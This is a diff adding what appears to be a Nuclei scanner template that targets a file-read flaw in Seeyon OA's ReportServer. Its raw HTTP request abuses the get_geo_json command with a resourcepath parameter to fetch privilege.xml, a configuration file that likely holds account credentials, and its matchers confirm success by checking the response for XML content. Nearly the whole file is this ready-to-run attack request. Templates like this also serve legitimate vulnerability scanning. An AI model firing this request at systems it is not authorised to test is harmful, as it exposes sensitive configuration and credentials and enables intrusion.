@@ -1,0 +1,23 @@
+id: seeyon-oa-ReportServer-fileread
+
+info:
+  name: seeyon-oa-ReportServer-fileread
+  author: seeyon
+  severity: high
+  tags: seeyon
+
+http:
+  - raw:
+      - |
+        GET /seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<?xml version=")'
+          - 'contains(body, "<![CDATA[")'
+        condition: and
